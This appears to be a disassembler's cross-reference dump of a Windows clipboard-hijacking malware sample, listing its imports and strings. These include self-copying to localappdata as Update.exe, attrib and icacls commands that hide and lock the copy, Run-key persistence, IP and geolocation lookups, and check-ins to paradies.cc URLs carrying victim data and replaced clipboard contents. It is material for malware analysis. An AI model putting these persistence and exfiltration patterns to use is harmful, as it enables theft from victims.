reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x402378	0x45f4a4	import	0x402320	api-ms-win-crt-time-l1-1-0.dll.strftime
0x4023ee	0x45f4a8	import	0x4023d0	api-ms-win-crt-time-l1-1-0.dll._time64
0x4023fe	0x45f4ac	import	0x4023d0	api-ms-win-crt-time-l1-1-0.dll._localtime64
0x402428	0x45f4a4	import	0x4023d0	api-ms-win-crt-time-l1-1-0.dll.strftime
0x4024bb	0x45f0f0	import	0x402480	KERNEL32.dll.FreeConsole
0x4024d3	0x46bc94	string	0x402480	7CmLQX
0x40251b	0x45f0f8	import	0x402480	KERNEL32.dll.OpenMutexA
0x40253e	0x46bc9c	string	0x402480	Update.exe
0x402579	0x46bca8	string	0x402480	Update
0x40259e	0x46bcb0	string	0x402480	localappdata
0x4025c9	0x45f360	import	0x402480	api-ms-win-crt-environment-l1-1-0.dll._dupenv_s
0x40262b	0x45f38c	import	0x402480	api-ms-win-crt-heap-l1-1-0.dll.free
0x4026c8	0x45f3e4	import	0x402480	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x402701	0x45f108	import	0x402480	KERNEL32.dll.GetModuleFileNameA
0x4028cc	0x45f3e4	import	0x402480	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x4028f5	0x45f104	import	0x402480	KERNEL32.dll.CreateMutexA
0x402900	0x45f0fc	import	0x402480	KERNEL32.dll.Sleep
0x40291e	0x45f010	import	0x402480	ADVAPI32.dll.GetUserNameA
0x40292c	0x46bdb0	string	0x402480	hitman
0x402931	0x45f268	import	0x402480	WININET.dll.InternetOpenA
0x402944	0x46bdb8	string	0x402480	https://myexternalip.com/raw
0x40294a	0x45f25c	import	0x402480	WININET.dll.InternetOpenUrlA
0x402966	0x45f264	import	0x402480	WININET.dll.InternetReadFile
0x40296d	0x45f260	import	0x402480	WININET.dll.InternetCloseHandle
0x4029e7	0x46bde4	string	0x402480	https://ipapi.co/
0x402a14	0x46bdd8	string	0x402480	/country
0x402ade	0x45f3e4	import	0x402480	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x402af6	0x46bdf8	string	0x402480	hitman69
0x402b16	0x45f268	import	0x402480	WININET.dll.InternetOpenA
0x402b3f	0x45f25c	import	0x402480	WININET.dll.InternetOpenUrlA
0x402b5b	0x45f264	import	0x402480	WININET.dll.InternetReadFile
0x402b62	0x45f260	import	0x402480	WININET.dll.InternetCloseHandle
0x402bdc	0x46bde4	string	0x402480	https://ipapi.co/
0x402c09	0x46be04	string	0x402480	/city
0x402cd3	0x45f3e4	import	0x402480	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x402ceb	0x46be0c	string	0x402480	hitman1337
0x402d0b	0x45f268	import	0x402480	WININET.dll.InternetOpenA
0x402d34	0x45f25c	import	0x402480	WININET.dll.InternetOpenUrlA
0x402d50	0x45f264	import	0x402480	WININET.dll.InternetReadFile
0x402d57	0x45f260	import	0x402480	WININET.dll.InternetCloseHandle
0x402e42	0x46be1c	string	0x402480	9fjb0Q0x0KIUFcnIG3AW
0x402e7d	0x46be34	string	0x402480	0.0.3
0x402eb8	0x46be3c	string	0x402480	five
0x402ee1	0x45f4a8	import	0x402480	api-ms-win-crt-time-l1-1-0.dll._time64
0x402eeb	0x45f4ac	import	0x402480	api-ms-win-crt-time-l1-1-0.dll._localtime64
0x402f39	0x45f4a4	import	0x402480	api-ms-win-crt-time-l1-1-0.dll.strftime
0x402fce	0x46bc84	string	0x402480	%d-%m-%Y
0x402fd9	0x45f4a4	import	0x402480	api-ms-win-crt-time-l1-1-0.dll.strftime
0x403079	0x45f4a4	import	0x402480	api-ms-win-crt-time-l1-1-0.dll.strftime
0x40310e	0x46bc84	string	0x402480	%d-%m-%Y
0x403119	0x45f4a4	import	0x402480	api-ms-win-crt-time-l1-1-0.dll.strftime
0x40319b	0x46bea8	string	0x402480	&username=
0x4031fa	0x46bea0	string	0x402480	&ip=
0x4032a7	0x46be94	string	0x402480	&country=
0x4032bd	0x46be94	string	0x402480	&country=
0x403368	0x46be8c	string	0x402480	&city=
0x40337e	0x46be8c	string	0x402480	&city=
0x403429	0x46be84	string	0x402480	&date=
0x40343f	0x46be84	string	0x402480	&date=
0x4034ea	0x46be7c	string	0x402480	&time=
0x403500	0x46be7c	string	0x402480	&time=
0x403595	0x4035bf	string	0x402480	j\nhp
0x4035ab	0x46be70	string	0x402480	&lastdate=
0x4035c1	0x46be70	string	0x402480	&lastdate=
0x403656	0x403680	string	0x402480	j\nhd
0x40366c	0x46be64	string	0x402480	&lasttime=
0x403682	0x46be64	string	0x402480	&lasttime=
0x40372d	0x46be5c	string	0x402480	&mwv=
0x403743	0x46be5c	string	0x402480	&mwv=
0x4037d8	0x403802	string	0x402480	j\nhP
0x4037ee	0x46be50	string	0x402480	&assigned=
0x403804	0x46be50	string	0x402480	&assigned=
0x403899	0x4038d5	string	0x402480	j\bhD
0x4038ba	0x46be44	string	0x402480	&worker=
0x4038d7	0x46be44	string	0x402480	&worker=
0x404134	0x45f3e4	import	0x402480	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x40414f	0x46beb4	string	0x402480	http://paradies.cc/paradies_api_v.php?code=000
0x40419e	0x45f20c	import	0x402480	USER32.dll.GetClipboardSequenceNumber
0x4041a6	0x45f0fc	import	0x402480	KERNEL32.dll.Sleep
0x4041ae	0x45f4a8	import	0x402480	api-ms-win-crt-time-l1-1-0.dll._time64
0x4041c7	0x45f4ac	import	0x402480	api-ms-win-crt-time-l1-1-0.dll._localtime64
0x4041fd	0x45f4a4	import	0x402480	api-ms-win-crt-time-l1-1-0.dll.strftime
0x404256	0x45f4a8	import	0x402480	api-ms-win-crt-time-l1-1-0.dll._time64
0x40426f	0x45f4ac	import	0x402480	api-ms-win-crt-time-l1-1-0.dll._localtime64
0x40429a	0x46bc84	string	0x402480	%d-%m-%Y
0x4042a8	0x45f4a4	import	0x402480	api-ms-win-crt-time-l1-1-0.dll.strftime
0x404313	0x46be70	string	0x402480	&lastdate=
0x404323	0x46be64	string	0x402480	&lasttime=
0x404351	0x46bea0	string	0x402480	&ip=
0x4043d3	0x46beb4	string	0x402480	http://paradies.cc/paradies_api_v.php?code=000
0x404442	0x45f208	import	0x402480	USER32.dll.OpenClipboard
0x404522	0x45f0f4	import	0x402480	KERNEL32.dll.GlobalAlloc
0x40454f	0x45f210	import	0x402480	USER32.dll.EmptyClipboard
0x404558	0x45f200	import	0x402480	USER32.dll.SetClipboardData
0x40455e	0x46be34	string	0x402480	0.0.3
0x40459b	0x46bea0	string	0x402480	&ip=
0x4045ab	0x46bef0	string	0x402480	&previous=
0x4045d9	0x46bee4	string	0x402480	&replaced=
0x404607	0x46be5c	string	0x402480	&mwv=
0x404635	0x46be84	string	0x402480	&date=
0x40465d	0x46be7c	string	0x402480	&time=
0x404685	0x46be50	string	0x402480	&assigned=
0x40475b	0x46befc	string	0x402480	http://paradies.cc/new_api_c.php?code=001
0x4047ba	0x45f20c	import	0x402480	USER32.dll.GetClipboardSequenceNumber
0x4047c7	0x45f1fc	import	0x402480	USER32.dll.CloseClipboard
0x404804	0x45f1fc	import	0x402480	USER32.dll.CloseClipboard
0x40485f	0x45f1a4	import	0x402480	MSVCP140.dll.sym_imp_protected: void __thiscall std::basic_ios<char, struct std::char_traits<char>>::constructor(void)
0x404882	0x45f144	import	0x402480	MSVCP140.dll.sym_imp_public: void __thiscall std::basic_iostream<char, struct std::char_traits<char>>::constructor(class std::basic_streambuf<char, struct std::char_traits<char>> *)
0x4048bc	0x45f1a8	import	0x402480	MSVCP140.dll.sym_imp_protected: void __thiscall std::basic_streambuf<char, struct std::char_traits<char>>::constructor(void)
0x4048e0	0x46bd54	string	0x402480	start cmd /Q /C " ping localhost -n 1 &&
0x4048f4	0x46bd4c	string	0x402480	copy "
0x40494e	0x46bcf0	string	0x402480	" &&
0x40495a	0x46bd34	string	0x402480	attrib +r +h +a "
0x404987	0x46bcf0	string	0x402480	" &&
0x404993	0x46bd28	string	0x402480	icacls "
0x4049c0	0x46bd00	string	0x402480	" /deny "everyone":(WD,AD,WEA,WA) &&
0x4049cc	0x46bcf8	string	0x402480	del "
0x4049f9	0x46bcf0	string	0x402480	" &&
0x404a05	0x46bce0	string	0x402480	cmd /C "start "
0x404a35	0x46bcd0	string	0x402480	" && exit" &&
0x404a41	0x46bcc4	string	0x402480	&& exit "
0x404a5e	0x46bd80	string	0x402480	SOFTWARE\Microsoft\Windows\CurrentVersion\Run
0x404a68	0x45f00c	import	0x402480	ADVAPI32.dll.RegCreateKeyA
0x404aaa	0x45f014	import	0x402480	ADVAPI32.dll.RegSetValueExA
0x404b87	0x45f3b0	import	0x402480	api-ms-win-crt-runtime-l1-1-0.dll.system
0x404bbc	0x45f3e4	import	0x402480	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x404c06	0x45f174	import	0x402480	MSVCP140.dll.sym_imp_public virtual: void __thiscall std::basic_iostream<char, struct std::char_traits<char>>::~destructor(void)
0x404c12	0x45f170	import	0x402480	MSVCP140.dll.sym_imp_public virtual: void __thiscall std::basic_ios<char, struct std::char_traits<char>>::~destructor(void)
0x404db2	0x45f3e4	import	0x402480	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x4051de	0x45f140	import	0x4051a0	MSVCP140.dll.sym_imp_protected: char * __thiscall std::basic_streambuf<char, struct std::char_traits<char>>::_Pninc(void)
0x40532d	0x45f140	import	0x4051a0	MSVCP140.dll.sym_imp_protected: char * __thiscall std::basic_streambuf<char, struct std::char_traits<char>>::_Pninc(void)
0x405343	0x45f3e4	import	0x4051a0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x4053fa	0x45f148	import	0x405360	MSVCP140.dll.sym_imp_public virtual: void __thiscall std::basic_streambuf<char, struct std::char_traits<char>>::~destructor(void)
0x405400	0x45f3e4	import	0x405360	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x40557d	0x45f1b8	import	0x405480	MSVCP140.dll._Strxfrm
0x40562a	0x45f1e4	import	0x405610	MSVCP140.dll._Strcoll
0x4057f4	0x45f3e4	import	0x405770	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x4057fc	0x40580b	string	0x405770	3ɋE\b@ blocks=Basic Latin,Latin Extended-B
0x40589f	0x45f174	import	0x405870	MSVCP140.dll.sym_imp_public virtual: void __thiscall std::basic_iostream<char, struct std::char_traits<char>>::~destructor(void)
0x4058a7	0x45f170	import	0x405870	MSVCP140.dll.sym_imp_public virtual: void __thiscall std::basic_ios<char, struct std::char_traits<char>>::~destructor(void)
0x4058ff	0x45f38c	import	0x4058f0	api-ms-win-crt-heap-l1-1-0.dll.free
0x40590a	0x45f184	import	0x4058f0	MSVCP140.dll.sym_imp_protected virtual: void __thiscall std::locale::facet::~destructor(void)
0x405b81	0x45f1c0	import	0x405b40	MSVCP140.dll.sym_imp_public: void __thiscall std::_Lockit::constructor(int)
0x405b93	0x45f1d8	import	0x405b40	MSVCP140.dll.sym_imp_class std::locale::id std::ctype<char>::id
0x405b9c	0x45f194	import	0x405b40	MSVCP140.dll.sym_imp_public: unsigned int __thiscall std::locale::id::operator unsigned int(void)
0x405bc0	0x45f1c4	import	0x405b40	MSVCP140.dll.sym_imp_private: static class std::locale::_Locimp * __cdecl std::locale::_Getgloballocale(void)
0x405be1	0x45f178	import	0x405b40	MSVCP140.dll.sym_imp_public: static unsigned int __cdecl std::ctype<char>::_Getcat(class std::locale::facet const * *, class std::locale const *)
0x405c15	0x45f1bc	import	0x405b40	MSVCP140.dll.sym_imp_public: void __thiscall std::_Lockit::~destructor(void)
0x405ef4	0x45f1ec	import	0x405e30	MSVCP140.dll.sym_imp_public: class std::basic_ostream<char, struct std::char_traits<char>> & __thiscall std::basic_ostream<char, struct std::char_traits<char>>::flush(void)
0x405f58	0x45f1ac	import	0x405e30	MSVCP140.dll.sym_imp_public: int __thiscall std::basic_streambuf<char, struct std::char_traits<char>>::sputc(char)
0x405f81	0x45f1b4	import	0x405e30	MSVCP140.dll.sym_imp_public: long long(__int64) __thiscall std::basic_streambuf<char, struct std::char_traits<char>>::sputn(char const *, long long(__int64))
0x405fa8	0x45f1ac	import	0x405e30	MSVCP140.dll.sym_imp_public: int __thiscall std::basic_streambuf<char, struct std::char_traits<char>>::sputc(char)
0x405fe9	0x45f1b0	import	0x405e30	MSVCP140.dll.sym_imp_public: void __thiscall std::basic_ios<char, struct std::char_traits<char>>::setstate(int, bool)
0x40600c	0x45f1b0	import	0x405e30	MSVCP140.dll.sym_imp_public: void __thiscall std::basic_ios<char, struct std::char_traits<char>>::setstate(int, bool)
0x406019	0x45f1cc	import	0x405e30	MSVCP140.dll.sym_imp_bool __cdecl std::uncaught_exception(void)
0x406028	0x45f1e8	import	0x405e30	MSVCP140.dll.sym_imp_public: void __thiscall std::basic_ostream<char, struct std::char_traits<char>>::_Osfx(void)
0x406371	0x45f3e4	import	0x406160	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x406438	0x45f3e4	import	0x4063b0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x406644	0x45f3e4	import	0x406540	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x40679e	0x45f3e4	import	0x406680	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x406905	0x45f3e4	import	0x4067e0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x406a0c	0x45f1c0	import	0x4069d0	MSVCP140.dll.sym_imp_public: void __thiscall std::_Lockit::constructor(int)
0x406a19	0x45f1e0	import	0x4069d0	MSVCP140.dll.sym_imp_class std::locale::id std::collate<char>::id
0x406a25	0x45f194	import	0x4069d0	MSVCP140.dll.sym_imp_public: unsigned int __thiscall std::locale::id::operator unsigned int(void)
0x406a4d	0x45f1c4	import	0x4069d0	MSVCP140.dll.sym_imp_private: static class std::locale::_Locimp * __cdecl std::locale::_Getgloballocale(void)
0x406aa7	0x45f1a0	import	0x4069d0	MSVCP140.dll.sym_imp_public: void __thiscall std::_Locinfo::constructor(char const *)
0x406ac1	0x45f188	import	0x4069d0	MSVCP140.dll.sym_imp_protected: void __thiscall std::locale::facet::constructor(unsigned int)
0x406ada	0x45f198	import	0x4069d0	MSVCP140.dll.sym_imp_public: struct _Collvec __thiscall std::_Locinfo::_Getcoll(void)
0x406aee	0x45f19c	import	0x4069d0	MSVCP140.dll.sym_imp_public: void __thiscall std::_Locinfo::~destructor(void)
0x406b21	0x45f3e4	import	0x4069d0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x406b63	0x45f1bc	import	0x4069d0	MSVCP140.dll.sym_imp_public: void __thiscall std::_Lockit::~destructor(void)
0x406c25	0x45f1cc	import	0x406c00	MSVCP140.dll.sym_imp_bool __cdecl std::uncaught_exception(void)
0x406c31	0x45f1e8	import	0x406c00	MSVCP140.dll.sym_imp_public: void __thiscall std::basic_ostream<char, struct std::char_traits<char>>::_Osfx(void)
0x406d7a	0x45f3e4	import	0x406ce0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x406e30	0x46bf28	string	0x406e30	vector too long
0x406e35	0x45f1dc	import	0x406e30	MSVCP140.dll.sym_imp_void __cdecl std::_Xlength_error(char const *)
0x406edb	0x45f1ec	import	0x406e40	MSVCP140.dll.sym_imp_public: class std::basic_ostream<char, struct std::char_traits<char>> & __thiscall std::basic_ostream<char, struct std::char_traits<char>>::flush(void)
0x406f33	0x45f1ac	import	0x406e40	MSVCP140.dll.sym_imp_public: int __thiscall std::basic_streambuf<char, struct std::char_traits<char>>::sputc(char)
0x406f5c	0x45f1b4	import	0x406e40	MSVCP140.dll.sym_imp_public: long long(__int64) __thiscall std::basic_streambuf<char, struct std::char_traits<char>>::sputn(char const *, long long(__int64))
0x406f82	0x45f1ac	import	0x406e40	MSVCP140.dll.sym_imp_public: int __thiscall std::basic_streambuf<char, struct std::char_traits<char>>::sputc(char)
0x406fbf	0x45f1b0	import	0x406e40	MSVCP140.dll.sym_imp_public: void __thiscall std::basic_ios<char, struct std::char_traits<char>>::setstate(int, bool)
0x406fe2	0x45f1b0	import	0x406e40	MSVCP140.dll.sym_imp_public: void __thiscall std::basic_ios<char, struct std::char_traits<char>>::setstate(int, bool)
0x406fef	0x45f1cc	import	0x406e40	MSVCP140.dll.sym_imp_bool __cdecl std::uncaught_exception(void)
0x406ffe	0x45f1e8	import	0x406e40	MSVCP140.dll.sym_imp_public: void __thiscall std::basic_ostream<char, struct std::char_traits<char>>::_Osfx(void)
0x4070e0	0x46bf38	string	0x4070e0	vector<bool> too long
0x4070e5	0x45f1dc	import	0x4070e0	MSVCP140.dll.sym_imp_void __cdecl std::_Xlength_error(char const *)
0x4070f6	0x45f1d4	import	0x4070f0	MSVCP140.dll.sym_imp_void __cdecl std::_Xregex_error(enum std::regex_constants::error_type)
0x40711e	0x46c220	string	0x407100	()$^.*+?[]|\-{},:=!\n\r\b
0x407123	0x45f240	import	0x407100	VCRUNTIME140.dll.strchr
0x40791a	0x45f3e4	import	0x407720	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x407a1c	0x45f3e4	import	0x4079d0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x408178	0x45f3e4	import	0x407f50	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x40820c	0x408220	string	0x4081d0	F;u\bu\vE
0x408355	0x45f3e4	import	0x4082c0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x4083ad	0x45f3e4	import	0x4082c0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x4084ab	0x45f180	import	0x408420	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x408b11	0x45f180	import	0x408a60	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x408b83	0x45f3e4	import	0x408a60	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x408baa	0x45f390	import	0x408a60	api-ms-win-crt-heap-l1-1-0.dll.realloc
0x408bb7	0x45f1d0	import	0x408a60	MSVCP140.dll.sym_imp_void __cdecl std::_Xbad_alloc(void)
0x408ccb	0x45f180	import	0x408bf0	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x408daa	0x408dc4	string	0x408bf0	2ɊG\b$ blocks=Basic Latin,Latin Extended-B
0x408dbe	0x408dc4	string	0x408bf0	2ɊG\b$ blocks=Basic Latin,Latin Extended-B
0x408de7	0x45f3e4	import	0x408bf0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x409529	0x40957c	string	0x4094f0	_^[]
0x4096f9	0x45f3e4	import	0x409690	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x40973d	0x45f38c	import	0x409720	api-ms-win-crt-heap-l1-1-0.dll.free
0x409762	0x45f38c	import	0x409720	api-ms-win-crt-heap-l1-1-0.dll.free
0x4097a8	0x45f38c	import	0x409720	api-ms-win-crt-heap-l1-1-0.dll.free
0x409ff2	0x45f180	import	0x409e20	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x40a057	0x45f3e4	import	0x409e20	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x40a077	0x45f180	import	0x409e20	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x40a0ce	0x45f180	import	0x409e20	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x40aafc	0x45f1d4	import	0x40aab0	MSVCP140.dll.sym_imp_void __cdecl std::_Xregex_error(enum std::regex_constants::error_type)
0x40ab13	0x45f1d4	import	0x40aab0	MSVCP140.dll.sym_imp_void __cdecl std::_Xregex_error(enum std::regex_constants::error_type)
0x40b1f0	0x45f180	import	0x40b1b0	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x40b201	0x45f180	import	0x40b1b0	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x40b509	0x45f38c	import	0x40b500	api-ms-win-crt-heap-l1-1-0.dll.free
0x40b95d	0x45f180	import	0x40b940	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x40b96f	0x45f180	import	0x40b940	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x40ba0a	0x45f180	import	0x40b940	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x40ba4e	0x45f390	import	0x40b940	api-ms-win-crt-heap-l1-1-0.dll.realloc
0x40baa9	0x45f390	import	0x40b940	api-ms-win-crt-heap-l1-1-0.dll.realloc
0x40bac6	0x45f1d0	import	0x40b940	MSVCP140.dll.sym_imp_void __cdecl std::_Xbad_alloc(void)
0x40bacc	0x45f390	import	0x40b940	api-ms-win-crt-heap-l1-1-0.dll.realloc
0x40bb00	0x45f1d0	import	0x40b940	MSVCP140.dll.sym_imp_void __cdecl std::_Xbad_alloc(void)
0x40bb69	0x40bb85	string	0x40bb30	:E\ft<
0x40bb81	0x40bb85	string	0x40bb30	:E\ft<
0x40bdb4	0x40bdef	string	0x40bd70	+KL+SL_;
0x40bed4	0x45f180	import	0x40be80	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x40bee5	0x45f180	import	0x40be80	MSVCP140.dll.sym_imp_public: char __thiscall std::ctype<char>::tolower(char)const
0x40c426	0x45f3e4	import	0x40c3b0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x40c4a9	0x45f3e4	import	0x40c3b0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x40c52c	0x45f3e4	import	0x40c4e0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x40cb8f	0x45f17c	import	0x40cab0	MSVCP140.dll.sym_imp_public: char const * __thiscall std::ctype<char>::tolower(char *, char const *)const
0x40cc29	0x45f3e4	import	0x40cab0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x40ccb9	0x45f17c	import	0x40cab0	MSVCP140.dll.sym_imp_public: char const * __thiscall std::ctype<char>::tolower(char *, char const *)const
0x40cecd	0x45f3e4	import	0x40cab0	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x40cf49	0x45f3e4	import	0x40cf00	api-ms-win-crt-runtime-l1-1-0.dll._invalid_parameter_noinfo_noreturn
0x40cff1	0x40d032	string	0x40cf90	_^[]
0x40d008	0x45f390	import	0x40cf90	api-ms-win-crt-heap-l1-1-0.dll.realloc
0x40d0d3	0x45f530	string	0x40d0b0	easy handle already used in multi handle
0x40d2ad	0x45f0ec	import	0x40d280	KERNEL32.dll.GetLastError
0x40d2f6	0x460634	string	0x40d280	SEC_E_ALGORITHM_MISMATCH
0x40d2fd	0x460ec4	string	0x40d280	%s (0x%08X)
0x40d333	0x460ed0	string	0x40d280	%s - %s
0x40d347	0x460650	string	0x40d280	SEC_E_BAD_BINDINGS
0x40d34e	0x460664	string	0x40d280	SEC_E_BAD_PKGID
0x40d355	0x460674	string	0x40d280	SEC_E_BUFFER_TOO_SMALL
0x40d35c	0x46068c	string	0x40d280	SEC_E_CANNOT_INSTALL
0x40d363	0x4606a4	string	0x40d280	SEC_E_CANNOT_PACK
0x40d36a	0x4606b8	string	0x40d280	SEC_E_CERT_EXPIRED
0x40d371	0x4606cc	string	0x40d280	SEC_E_CERT_UNKNOWN
0x40d378	0x4606e0	string	0x40d280	SEC_E_CERT_WRONG_USAGE
0x40d382	0x4606f8	string	0x40d280	SEC_E_CONTEXT_EXPIRED
0x40d38c	0x460710	string	0x40d280	SEC_E_CROSSREALM_DELEGATION_FAILURE
0x40d396	0x460734	string	0x40d280	SEC_E_CRYPTO_SYSTEM_INVALID
0x40d3a0	0x460750	string	0x40d280	SEC_E_DECRYPT_FAILURE
0x40d3aa	0x460768	string	0x40d280	SEC_E_DELEGATION_POLICY
0x40d3b4	0x460780	string	0x40d280	SEC_E_DELEGATION_REQUIRED
0x40d3be	0x46079c	string	0x40d280	SEC_E_DOWNGRADE_DETECTED
0x40d3c8	0x4607b8	string	0x40d280	SEC_E_ENCRYPT_FAILURE
0x40d3d2	0x4607d0	string	0x40d280	SEC_E_INCOMPLETE_CREDENTIALS
0x40d3dc	0x4607f0	string	0x40d280	SEC_E_INCOMPLETE_MESSAGE
0x40d3e6	0x46080c	string	0x40d280	SEC_E_INSUFFICIENT_MEMORY
0x40d3f0	0x460828	string	0x40d280	SEC_E_INTERNAL_ERROR
